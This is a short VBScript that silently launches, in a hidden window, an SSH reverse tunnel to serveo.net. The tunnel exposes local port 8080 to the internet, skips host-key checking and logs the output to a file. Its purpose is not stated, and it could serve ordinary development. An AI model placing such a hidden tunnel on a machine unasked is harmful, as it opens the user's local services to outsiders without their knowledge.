Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "cmd /c ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 serveo.net > serveo_log.txt 2>&1", 0, False
